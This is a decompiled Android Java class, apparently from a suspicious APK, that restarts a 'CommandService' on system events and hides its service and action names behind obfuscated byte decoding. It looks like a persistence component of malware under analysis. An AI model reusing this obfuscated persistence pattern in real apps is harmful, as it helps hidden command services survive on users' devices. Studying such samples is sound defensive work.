package com.base.template.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.base.template.services.CommandService;
import okhttp3.Headers;
import p000.C0000;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage4/classes.dex */
public final class SystemEventReceiver extends BroadcastReceiver {
    @Override // android.content.BroadcastReceiver
    public final void onReceive(Context context, Intent intent) {
        BroadcastReceiver.PendingResult pendingResultGoAsync = goAsync();
        try {
            try {
                CommandService commandService = CommandService.instance;
                if (CommandService.instance == null) {
                    Headers.Companion.safeStartService(context, C0000.decode(new byte[]{107, 109, 98, 98, 115, 127, 104, 36, 48, 118, 118, 96, 110, 100, 115, 97, 99, 32, 52, 103}, "8416627af3", false));
                } else {
                    try {
                        Intent intent2 = new Intent(context, (Class<?>) CommandService.class);
                        intent2.setAction(C0000.decode(new byte[]{53, 49, 121, 36, 38, 35, 54, 60, 49, 42, 126, 36}, "ac0cafdc", true));
                        context.startForegroundService(intent2);
                    } catch (Exception unused) {
                    }
                }
            } catch (Exception e) {
                e.getMessage();
            }
        } finally {
            pendingResultGoAsync.finish();
        }
    }
}
